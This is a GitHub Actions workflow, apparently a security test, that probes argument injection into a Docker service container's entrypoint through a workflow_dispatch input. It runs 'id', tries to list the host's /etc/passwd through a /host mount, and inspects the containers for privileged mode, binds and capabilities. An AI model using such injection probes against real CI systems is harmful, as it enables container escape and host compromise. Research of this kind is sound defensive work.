name: "Test 10: Refined docker arg injection"
on:
  workflow_dispatch:
    inputs:
      entrypoint:
        description: "Entrypoint"
        required: false
        default: "/bin/sh"
jobs:
  test-a:
    runs-on: ubuntu-latest
    name: "Payload A"
    services:
      target:
        image: alpine:3.19
        entrypoint: ${{ github.event.inputs.entrypoint }}
        command: -c "echo TEST_A && id && ls /host/etc/passwd 2>&1 && sleep 30"
    steps:
      - run: sleep 5
      - name: Results A
        run: |
          echo "=== DOCKER CREATE ==="
          echo "See Initialize containers in logs"
          for CID in $(docker ps -aq); do
            echo "=== LOGS ==="
            docker logs "$CID" 2>&1
            echo "=== INSPECT ==="
            docker inspect "$CID" --format 'Privileged={{.HostConfig.Privileged}} PidMode={{.HostConfig.PidMode}} Binds={{.HostConfig.Binds}} CapAdd={{.HostConfig.CapAdd}}' 2>&1
          done
